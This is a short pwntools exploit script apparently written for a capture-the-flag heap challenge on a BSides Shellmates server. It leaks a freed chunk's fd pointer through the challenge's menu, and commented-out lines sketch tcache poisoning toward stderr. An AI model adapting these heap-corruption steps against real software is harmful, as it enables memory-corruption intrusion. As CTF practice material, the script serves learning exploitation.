#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('junior-pwner.bsides.shellmates.club', 443)
else:
    p = process(exe.path)

GDB()
sla(b": \n", b"0")
sla(b": ", b"0")
sla(b": ", b"32")
sla(b": ", b"a"*8)

sla(b": \n", b"1")
sla(b": ", b"0")

sla(b": \n", b"2")
sla(b": ", b"0")
fd_pointer = u64(p.recvuntil(b"\n0)", drop=True) + b"\0\0\0")
info("fd pointer: " + hex(fd_pointer))

# sla(b": \n", b"3")
# sla(b": ", b"0")
# sa(b": ", b"\0"*32)

# new_fd = fd_pointer ^ exe.sym['stderr']
# sla(b": \n", b"3")
# sla(b": ", b"0")
# sa(b": ", p64(new_fd))

# sla(b": \n", b"0")
# sla(b": ", b"0")
# sla(b": ", b"32")
# sla(b": ", b"a"*8)

# sla(b": \n", b"0")
# sla(b": ", b"0")
# sla(b": ", b"32")
# sla(b": ", b"\0")
p.interactive()
